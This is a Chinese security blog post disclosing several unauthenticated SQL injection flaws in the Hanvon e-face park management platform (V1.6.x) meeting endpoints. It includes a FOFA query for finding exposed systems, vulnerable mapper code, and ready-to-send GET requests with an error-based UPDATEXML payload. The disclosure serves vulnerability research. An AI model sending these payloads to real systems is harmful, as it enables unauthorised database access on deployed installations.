---
title: "汉王e脸通综合管理平台 Meeting 多个SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-Meeting-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-meeting-多个sql注入漏洞
---

# 汉王e脸通综合管理平台 Meeting 多个SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/14 08:26
- 1105浏览
- [0评论](#comment)
- 1小时阅读

深入探索

SQL

软件

计算机安全

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `queryMeetingFile.do`、`queryMeetingRoom.do`、`queryMeetingEmployee.do`、`queryMeetingRecord.do`、`queryMeetingAudit.do`、`queryMeeting.do` 等多个接口存在 [SQL 注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入检测工具

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

漏洞扫描器

Docker加速服务

传输层安全性协议

## queryMeeting.do

直接看 `MeetingController` 里关于 `queryMeeting` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"/queryMeeting.do"},
        method = {RequestMethod.GET}
    )
    public RequestJson queryMeeting(@RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "keys") String keys, @RequestParam(required = false,value = "mtBranch") String mtBranch, @RequestParam(required = false,value = "meetingName") String meetingName, @RequestParam(required = false,value = "start") String start, @RequestParam(required = false,value = "end") String end, @RequestParam(required = false,value = "meetingRoom") Long meetingRoom, @RequestParam(required = false,value = "state") Integer state, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order) {
        RequestJson result = new RequestJson();

        try {
            if (page == null) {
                page = Constants.DEFAULT_START_PAGE_INDEX;
            }

            if (pageSize == null) {
                pageSize = Constants.PAGE_SIZE;
            }

            MeetingParam meetingParam = new MeetingParam();
            meetingParam.setKeys(keys);
            meetingParam.setMtBranch(mtBranch);
            meetingParam.setMtName(meetingName);
            meetingParam.setMtStartTime(start);
            meetingParam.setMtEndTime(end);
            meetingParam.setMrId(meetingRoom);
            meetingParam.setColumnKey(columnKey);
            meetingParam.setOrder(order);
            if (state == 2) {
                meetingParam.setMtDate(DateUtils.formatDate(DateUtils.getDate()));
            }

            PageHelper.startPage(page, pageSize);
            List<MeetingTpm> list = this.meetingAsm.queryMeeting(meetingParam);
```

深入探索

Nessus

SQL注入防护

漏洞预警服务

和 汉王e脸通综合管理平台 queryDoorInfoList.do SQL注入漏洞 处理逻辑差不多，直接看对应的 mapper xml文件 MeetingDsm.xml

代码安全审计

```
<!--查询会议信息列表-->
    <select id="queryMeeting" parameterType="com.hanvon.iface.tpm.meeting.param.MeetingParam" resultMap="ResultMapVO">
        SELECT MT.ID,MT.MT_NAME,MT.MT_DATE,MT.MT_START_TIME,MT.MT_END_TIME,MT.MT_SIGNIN_STARTTIME,
        MT.MT_SIGNIN_ENDTIME,MT.MR_ID,MT.MT_CONTENT,MT.MT_DELETE,MT.MT_STATE,MT.MT_CREATE_TIME,
        MT_IS_SIGNIN,MT_IS_SIGNOUT,
        MT.MT_DEVICE_ID,MT.MT_SIGNOUT_STARTTIME,MT.MT_SIGNOUT_ENDTIME,SU.SZ_NAME as applicant,sb.sz_name as branchName,
        MMT.MR_NAME AS MRNAME,(SELECT COUNT(1) FROM mt_meeting_file MMF WHERE MMF.MT_ID = MT.ID) AS SUM
        FROM mt_meeting MT
        LEFT JOIN mt_meeting_room MMT ON MT.MR_ID = MMT.ID
        LEFT JOIN sys_user SU ON MT.MT_CREATE_ID = SU.NG_ID
        LEFT JOIN sys_branch sb on sb.ng_id = (SELECT sub.ng_branch_id from sys_user_branch sub where sub.ng_user_id
        =MT.MT_CREATE_ID )
        WHERE MT.MT_DELETE = 1 and MT.MT_STATE = 1
        <if test="keys != null">
            AND (
            SU.SZ_NAME like CONCAT('%',#{keys},'%')
            OR MT_CREATE_ID like CONCAT('%',#{keys},'%')
            )
        </if>
        <if test="mtName != null and mtName != ''">
            AND MT.MT_NAME like CONCAT('%',#{mtName},'%')
        </if>
        <if test="mtBranch != null and mtBranch != ''">
            AND sb.sz_name like CONCAT('%',#{mtBranch},'%')
        </if>
        <if test="mtStartTime != null">
            AND DATE(MT.MT_DATE) &gt;= DATE(#{mtStartTime,jdbcType=VARCHAR})
        </if>
        <if test="mtEndTime != null">
            AND DATE(#{mtEndTime,jdbcType=VARCHAR}) &gt;= DATE(MT.MT_DATE)
        </if>
        <if test="mrId != null">
            and MT.MR_ID = #{mrId}
        </if>
        <if test="mtDate != null">
            and MT.MT_DATE = #{mtDate,jdbcType=VARCHAR}
        </if>
        ORDER BY
        <if test="order == null or order == ''">
            MT.MT_CREATE_TIME desc
        </if>
        <if test="order != null and order != ''">
            ${columnKey} ${order}
        </if>
    </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成SQL注入漏洞。

漏洞扫描服务

## queryMeetingAudit.do

[![汉王e脸通综合管理平台 Meeting 多个SQL注入漏洞](images/img-001-630f7a4d8505.webp)](https://image.mrxn.net/ecd54c5fb5464ecbb9ef1504c0713ab0.webp)

[![汉王e脸通综合管理平台 Meeting 多个SQL注入漏洞](images/img-002-c318f0788a15.webp)](https://image.mrxn.net/53375f895689483d96d8857a53f96370.webp)

## queryMeetingRecord.do

[![汉王e脸通综合管理平台 Meeting 多个SQL注入漏洞](images/img-003-7e59a8cbbeac.webp)](https://image.mrxn.net/eafcf3c081eb49eca86e73c5ae300fb3.webp)

[![汉王e脸通综合管理平台 Meeting 多个SQL注入漏洞](images/img-004-5da6ef1f1566.webp)](https://image.mrxn.net/e47f3561c8c54c2bb0ac1ebb497ca3de.webp)

MeetingPersonalController 下的 queryMeetingRecord.do 也是如此

物流软件安全

[![汉王e脸通综合管理平台 Meeting 多个SQL注入漏洞](images/img-005-2a9c3947d2fb.webp)](https://image.mrxn.net/84228649685c48bf9ae3b218d196022c.webp)

[![汉王e脸通综合管理平台 Meeting 多个SQL注入漏洞](images/img-006-b112d149d25e.webp)](https://image.mrxn.net/cafcdf9845304d0990ef0f7ff72a430b.webp)

## queryMeetingEmployee.do

[![汉王e脸通综合管理平台 Meeting 多个SQL注入漏洞](images/img-007-f6fa97f9c341.webp)](https://image.mrxn.net/84642aaa02354f9c89da5f9362f6c83f.webp)

需要注意 meetingId 必须存在

Windows安全工具

[![汉王e脸通综合管理平台 Meeting 多个SQL注入漏洞](images/img-008-a80d7652344d.webp)](https://image.mrxn.net/adb225b0ec1746859dfbc2b4d2af419d.webp)

## meetingFileManage.do

[![汉王e脸通综合管理平台 Meeting 多个SQL注入漏洞](images/img-009-e4dcaf451d23.webp)](https://image.mrxn.net/4f104a58a4524909bc66734aacd24243.webp)

[![汉王e脸通综合管理平台 Meeting 多个SQL注入漏洞](images/img-010-e20e3111173b.webp)](https://image.mrxn.net/96f34cd2d2fc46e39d578e754e045b39.webp)

## queryMeetingFile.do

[![汉王e脸通综合管理平台 Meeting 多个SQL注入漏洞](images/img-011-1f746d9545c8.webp)](https://image.mrxn.net/a5caa065baf84f6d8d8ec610a9d434f6.webp)

需要注意 mtId 必须存在

编程

[![汉王e脸通综合管理平台 Meeting 多个SQL注入漏洞](images/img-012-699277ad287c.webp)](https://image.mrxn.net/3cd1ed6e0e214087bb9ab467d9bbf14a.webp)

## meetingFileManage.do

[![汉王e脸通综合管理平台 Meeting 多个SQL注入漏洞](images/img-013-79d6192e015a.webp)](https://image.mrxn.net/54edae34cd874165a93e29f644f77e04.webp)

[![汉王e脸通综合管理平台 Meeting 多个SQL注入漏洞](images/img-014-b4c53c24ebdb.webp)](https://image.mrxn.net/d879577ba32c406ab4e3a8851aae113f.webp)

## queryMeetingRoom.do

[![汉王e脸通综合管理平台 Meeting 多个SQL注入漏洞](images/img-015-d127e17b0d5c.webp)](https://image.mrxn.net/256aa2c2375741f78f3cae45e9942e39.webp)

[![汉王e脸通综合管理平台 Meeting 多个SQL注入漏洞](images/img-016-47a99ea4c776.webp)](https://image.mrxn.net/ed77874944a44592a0d57945b97b5785.webp)

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

## queryMeeting.do

```
GET /manage/meeting/queryMeeting.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357))&state=2 HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 Meeting 多个SQL注入漏洞](images/img-017-24a8445adcb5.webp)](https://image.mrxn.net/997068e69b2f46dbae705744d2b7b82a.webp)

成功利用报错注入获取到数据版本号

数据管理

## queryMeetingAudit.do

```
GET /manage/meeting/queryMeetingAudit.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357))&order=DESC&state=2 HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 Meeting 多个SQL注入漏洞](images/img-018-cd756bdfc6bb.webp)](https://image.mrxn.net/5f5552a71b6443e3b075fefe272e995b.webp)

利用报错注入获取数据版本号

SQL注入检测工具

## queryMeetingRecord.do

```
GET /manage/meeting/queryMeetingRecord.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357))&state=2 HTTP/1.1
Host: hanvon.mrxn.net

GET /manage/meetingPersonal/queryMeetingRecord.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357))&state=2 HTTP/1.1
Host: hanvon.mrxn.net
```

## queryMeetingEmployee.do

```
GET /manage/meetingPersonal/queryMeetingEmployee.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357))&meetingId=2 HTTP/1.1
Host: hanvon.mrxn.net
```

## meetingFileManage.do

```
GET /manage/meeting/meetingFileManage.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357))&meetingId=2 HTTP/1.1
Host: hanvon.mrxn.net
```

## queryMeetingFile.do

```
GET /manage/meeting/queryMeetingFile.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357))&mtId=2 HTTP/1.1
Host: hanvon.mrxn.net
```

## meetingFileManage.do

```
GET /manage/meetingPersonal/meetingFileManage.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357))&mtId=2 HTTP/1.1
Host: hanvon.mrxn.net
```

## queryMeetingRoom.do

```
GET /manage/meetingRoom/queryMeetingRoom.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357))&mtId=2 HTTP/1.1
Host: hanvon.mrxn.net
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.queryMeeting.do](#toc-4-1-)
- [4.2.queryMeetingAudit.do](#toc-4-2-)
- [4.3.queryMeetingRecord.do](#toc-4-3-)
- [4.4.queryMeetingEmployee.do](#toc-4-4-)
- [4.5.meetingFileManage.do](#toc-4-5-)
- [4.6.queryMeetingFile.do](#toc-4-6-)
- [4.7.meetingFileManage.do](#toc-4-7-)
- [4.8.queryMeetingRoom.do](#toc-4-8-)
- [5.漏洞复现](#toc-5-)
- [5.1.queryMeeting.do](#toc-5-1-)
- [5.2.queryMeetingAudit.do](#toc-5-2-)
- [5.3.queryMeetingRecord.do](#toc-5-3-)
- [5.4.queryMeetingEmployee.do](#toc-5-4-)
- [5.5.meetingFileManage.do](#toc-5-5-)
- [5.6.queryMeetingFile.do](#toc-5-6-)
- [5.7.meetingFileManage.do](#toc-5-7-)
- [5.8.queryMeetingRoom.do](#toc-5-8-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKkklEQVR4AeycgZrbOA6D8/f933lvYAYSLdGOs80muVbzlQUFgLQiRpOZ7X3363a7/fO78c/9y33uyw0qbhMu/DXWep0xtzH/iLNuf8YzrfJd9efas1wD+dHXn285gTaQn0nfnomzFwDcIKLywWMNaPuB2e+95v7mIPzwfA+I2tzXufsL4ZpP3kfh/sI2EC1WfP4EpoFATB5qPNuy3wnZYw56v4qD0K0Jcx/l4hxaKyDqAC2nALbbOgk/BMza2P/H1m6q8mcCoj/UWPWaBlKZFve+E1gDed9ZX3rSSwcCcTV97YXVLmD2yauo/OYg6qCjtasIvVbPG8N9Mg9RY01oXfkr46UDeeXG/tZe//lA4Nq7C2afh3L2brQmtP9ZhHg20EqB7YcBoHHvSP6bgbxj53/oM9ZAvmyw00B09c/iyv6Bdt2rXu4B3VdxELq1s17ywN4vrqoxJ/0o7BHaA9EfOlqrULVnUdVMA6lMi3vfCbSBQJ86PM7PtpjfFRC9sh+Cyz7rFWcNog4w1W4i9P9u1cSUAJs3Udsaep2eDbPPNdId5iqE6AHXMPdoA8nkyj93Amsgnzv78sm/fAV/B93ZPaBfVWuP0LXZZw6iX9YgOHuEEFz2jTmEBxilba0+CqB9S9uE4S95FKaVvyLWDfGJfgmeDgTiXVLtFUIDKvlpDmjvSNjn1TvPD4DuNZf9FZd15dB7QOTix4DQALctETh8LbkAZt/pQHLxF+R/xRbaQCCmlV+13yEQGtBka0Jge0c0MSXSFYkqU3mOwgUQz4H9j6pjnf1C6DVQ57leNQqYvdkHsw7BZZ9z9VRAeKC/BvGONhATCz97Amsgnz3/6enTQKBfqcn9Q0DXIXJfS4j1j639gZlrYpFA+KGjbX6OEEK3JoSZk1ch/UrIO4brIPpD/3Zjrz1C6D6IXPwYEJp7CKeBjEVr/d4T+AUxJT9WU3LAXrNHaI9Q698NiGep3xgQGnS0BzrnPUDnIHJrrstoTQh7vzjHUY30Ssucc3kdFbduiE/nS3AN5EsG4W1MA4G4soA97X8opitmEth+94CO1uQbw5rQmnKHOej9IHJ7MkJorruKVQ+IXkCTgfb63Bs6B5G7AGINmNohsPVzLyEEl43TQLL4V+Rf9iKngWhyjmqv1jLaZ87rjBDvBqgxe527X4X2ZITofcZBeIBsa7mf1YgHCTC985/tkR8xDSSLK3//CayBvP/MT5/Y/oHKLogrCJjaIbBdUei4MwwLCF+mfaUzQvgyl2vG3L6Rf2Zd9YDYR9XH/goh6oCqtP1gVIlAO9N1Q6oT+iDXflOvpm6u2p+1jJWv4qC/IyDyyjdyEF5glA7X3p8NXgvPOGtCoL2DYZ9LHwPCk3mYOe1hjHVD8ql9Qb4G8gVDyFs4/VCH+Zq5GEKDGe3JOF7No3WuGfNcYw36861bE0LoyseA0KBj1aPixl72CEftaA3x3KyvG5JP43X5v+7UPtSrDpq2AmKSMP/DjPSq9t9y0J8Fj/P8HJj91iE0rzPqNTjg2FfVmIOoA0ztcOwP/SyB9kPDuiG7Y/v8YhqIJymEmJxyBwQHHa0Z88syB90PkWcfBGe/MOtjLn0Me0Y+ryGeA9i+w+x1boPXQnPA9u72WihdAaEBorcQ7wCm2mkgW9X662MnsAbysaOvH9wGAnF9oON4taB/EFkTjq2h9xi1vIbuUx8FzJz4MXIf5/ZA7wGR25PxzA9RB+SSlgPbtxv3yAizBsG1Bj+Ja37S9qcNpDEr+egJTAPx1IRnO4OYOHS0X7UOCN1aRnuEcOyDWYNjTv3G8HMzD3MP+zJC+KCj+0DnIPJc6/yqfxqIGyz8zAmsgXzm3A+f2v5bVnWlqiqIa2m/sPKZkz6GNYhegKkdArsPzp14X0B4gDtTA7D1qtS8v0e6vRD9vM51FQd7vzy5xvm6IT6JL8H237IgJljtS9McA8IPTCXA9m4EmgY0buyV162gSKD3sHy11j7oPcy51xFCr4HIXQv7tXj3gdCg/7pgLaNqHOuG5JP5gnwN5AuGkLfQBuIrkzEbnUNcw+xzDrMGMzf2Akzt0H135H1hDWjfCu9SCRC+UixI9z9Cl1iH6A8d7ckIsw6dawPJRSv/3AlMA4E+LYg8b+/sHWGt8mcO5r7W3UMI4YNAe45QNYqsw75WusM+CA9gqt06qDmg9KiB+2eE8GdO3jGmgYyGtX7vCbRfDCEmWD0eQgOanCftHNi9a6CvW2FKXCeE8Ca5pdIVjfhJIPziHRDcj3z4B8IDNI/rhSaVO4DtdVkTWlOu8Fqo9TOhGscHbsgzW/37vGsgXzbz9pu6r0yF1Z4hrjHQZNc2IiXAdu2BxgKn3NjPa2FrkhLxikS9JFXPMSD2fvUBrs9+cxC9gNu6Ibfv+mof6le3BTFNT1cIwbmHOIe5jJVWca6B6A8dK+2Ms5YRol/mnENogKlTBNpth8hPCw7EdUMODuZT9BrIp07+4LntQ906xHWDjv52Iqx84hXQayBy8WPArLnvVRx7au1a5Q5zRvMZIfYD2PYQXW+j10JzjxDYvs2pxrFuyKNTe7M+fah7UhkhJgm07WXdpDmvMwLbuwHqf6yB0N1D6HrlY1h7FiGeA5Sl43O0Bra9lwV3EsID3JnrAGz9gT/nx97bH/K1vmV92SCnD/Vqf7q2DuvQrxnsc3uEEJrrheLHEK+A8AOjpV1r6Bqw44GpLhN6hgPYar0WZq9z8QqvhTDXypNDPgeE3+sjXDfk6GQ+xE8f6hCThBrzO2DMz14D1P0g+KoWQoPA/Dz7M+fcmtCcEaIXIHkLYLspcI6b+f7X2O9ObwBzn00Y/nKPTK8bkk/jC/I1kC8YQt7C0x/qMF9HCC43du5rmdHa7yDEM6Gj+0HnIHJreR9VfuaD6AUd7YeZsyb0s6D7IHJrwnVDdFpfFNOHuqY0Rt7vqOV19p3lucY5zO8W9xg9gKX2/7IjTyNTIl4BHH5wJ3uZQtRWonofRfZD9Mhe6xAasH5Tv51+vV9snyHQpwTP5d52nr5ziF72HOHoB5oV2N7djUgJhAYd3UuYrFMqXZEFrRVQ95OmyDXKofu1HkM1Cph94h3rM2Q8uQ+v10A+PIDx8W0gvjJXcWx0tHY/6FcV5tz19gtHzuuM8jkyP+aVB+Z9QHBjvdYQGqDlLtxfuBMuLIDtWzKwPtRvX/bVboj3BX1aMOf2nSGc1+ldpMg9IGoyJ48CHmtQ/8NX7qdc/RxaK7wWaq1Q7tBa4bVQawXE3mBG6WOo1mHNa+E0EJsWfuYE1kA+c+6HT33pQCCubX6arqEicxA+8WNUvsw5h7nHqAGmLqP3UxUA7cO30s2d9bBHWPleOhA9ZMXjEzhzvHQgnnjGs4dnDeLdl7kxf9QX5h4QHASOPcc1hA9mHL1a5z05Fz8GRL+R1xpCA9aPvbcv+3rpDfmy1/Z/uZ1pIL52R3jlVUK/ghB57uceEBpgqn1owrXfK1phSvKzxjzZLqfuURUAuz1DX7suY+4B4c36NJBcsPL3n0AbCMS04BqebTVP3Dn0vuZyD3MZIWrMZf+zOUSvR3XPPuvMD/FM6Pjo+W0gj4xLf88JrIG855wvP+V/AAAA//9P06WPAAAABklEQVQDAP7HxIwPo1d+AAAAAElFTkSuQmCC)

手机扫码阅读
